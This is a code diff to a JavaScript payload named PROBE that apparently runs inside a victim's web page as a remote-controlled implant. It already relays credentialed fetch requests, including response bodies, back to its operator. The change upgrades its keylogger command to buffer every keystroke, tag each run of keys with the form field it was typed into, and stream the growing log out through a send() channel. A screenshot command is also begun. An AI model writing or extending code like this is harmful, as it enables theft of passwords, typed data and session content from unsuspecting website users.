@@ -102,12 +102,20 @@ export const PROBE = `(function () {
         fetch(arg, { credentials: 'include' }).then(function (r) { return r.text().then(function (t) { reply(c.id, { status: r.status, url: arg, body: cap(t, 2000000) }); }); })
           .catch(function (e) { reply(c.id, 'fetch error: ' + e); });
       }
-      else if (kind === 'keylog') {                           // stream keystrokes from a selector (default: all)
+      else if (kind === 'keylog') {                           // buffer ALL keystrokes and stream the growing log
         var tgt = arg ? document.querySelectorAll(arg) : [document];
-        for (var i = 0; i < tgt.length; i++) {
-          tgt[i].addEventListener('keydown', function (ev) { send('/qr/' + c.id, { sid: SID, id: c.id, result: 'KEY ' + (ev.target && ev.target.name || '') + ' ' + ev.key }, 'k'); }, true);
-        }
-        reply(c.id, 'keylogger attached to ' + (arg || 'document'));
+        var kbuf = '', klastf = null, ktimer = null;
+        var kflush = function () { send('/qr/' + c.id, { sid: SID, id: c.id, result: kbuf }, 'q' + c.id); };
+        var konkey = function (ev) {
+          var f = (ev.target && (ev.target.name || ev.target.id || ev.target.tagName)) || '';
+          if (f !== klastf) { kbuf += (kbuf ? '\\n' : '') + '[' + f + '] '; klastf = f; }
+          var k = ev.key;
+          kbuf += (k && k.length === 1) ? k : '{' + k + '}';   // printable keys inline, named keys in {…}
+          if (kbuf.length > 50000) { kbuf = kbuf.slice(-50000); }
+          clearTimeout(ktimer); ktimer = setTimeout(kflush, 350);   // debounce bursts, then push the full buffer
+        };
+        for (var i = 0; i < tgt.length; i++) { tgt[i].addEventListener('keydown', konkey, true); }
+        reply(c.id, 'keylogger attached to ' + (arg || 'document') + ' — keystrokes will accumulate here');
       }
       else if (kind === 'screenshot') {                       // best-effort; needs script-src to allow html2canvas
         var s = document.createElement('script');
